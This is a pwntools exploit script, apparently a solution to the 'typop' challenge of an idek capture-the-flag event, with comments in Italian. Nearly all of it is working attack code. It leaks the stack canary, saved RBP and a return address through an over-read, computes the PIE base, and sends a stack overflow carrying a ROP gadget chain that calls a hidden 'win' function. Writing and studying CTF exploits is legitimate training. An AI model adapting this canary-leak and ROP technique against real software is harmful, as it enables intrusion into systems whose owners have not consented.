#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template '--host=typop.chal.idek.team' '--port=1337' chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'typop.chal.idek.team'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# Primo ciclo
io.sendlineafter(b'survey?', b'y')
io.sendlineafter(b'ctf?', b'A' * 10)
io.recvline()
io.recvline()

# Ricevo il canary
canary = b'\x00' + io.recv(7)
info(f"Canary leaked: {hex(int.from_bytes(canary, byteorder = 'little'))}")

rbp = io.recv(6)
info(f"RBP leaked: {hex(int.from_bytes(rbp, byteorder = 'little'))}")

hope_is_rsp = int.from_bytes(rbp, byteorder = 'little') - 16

payload = flat(
    b'A' * 10,
    canary,
)

io.sendafter(b'feedback?', payload)

# Secondo ciclo
io.sendlineafter(b'survey?', b'y')
io.sendlineafter(b'ctf?', b'A' * 25)
io.recvline()
io.recvline()

# Ricevo return address
ret_addr = io.recv(6)
info(f"Return address leaked: {hex(int.from_bytes(ret_addr, byteorder = 'little'))}")

# Calcolo base del binario
binary_base = int.from_bytes(ret_addr, byteorder='little') - 0x1447
info(f"Base: {hex(binary_base)}")

win = binary_base + 0x1249

# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_registers = 0x0000000014cc + binary_base

# xor ebx, ebx; nop [rax]; mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8];
mov_reg_call = 0x000014a7 + binary_base

payload = flat(
    b'BB',
    p64(win),
    canary,
    hope_is_rsp,
    p64(pop_registers),
    p64(ord('f')),
    p64(ord('l')),
    p64(ord('a')),
    p64(int.from_bytes(rbp, byteorder = 'little') - 32),
    p64(mov_reg_call),
)

io.sendafter(b"feedback?", payload)


io.interactive()
    

